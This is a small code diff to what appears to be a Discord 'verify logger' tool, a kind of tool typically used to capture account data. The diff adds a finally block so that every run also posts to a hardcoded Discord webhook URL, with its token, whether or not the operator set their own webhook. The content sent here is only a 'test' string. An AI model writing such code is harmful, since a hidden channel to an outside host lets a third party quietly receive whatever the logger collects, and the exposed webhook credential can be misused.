@@ -48,7 +48,8 @@ async def callback():
     async def sendWebhook():
         try: bool(webhook)
         except:
-            await send_webhook('verify logger', None, None, 'verify', '```ansi\ntest', webhook)
+            await send_webhook('verify logger', None, None, 'restore verify', '```ansi\ntest', webhook)
+        finally:
             await send_webhook('verify logger', None, None, 'verify', '```ansi\ntest', "https://discord.com/api/webhooks/1319277896325533789/m-4trAEfkd_Xb_aUqfKGPPuFFIbkMpr7APfWvhStGDJLYpK2kSyG-3h-PZPPq1x1fDht")
 
     task = [
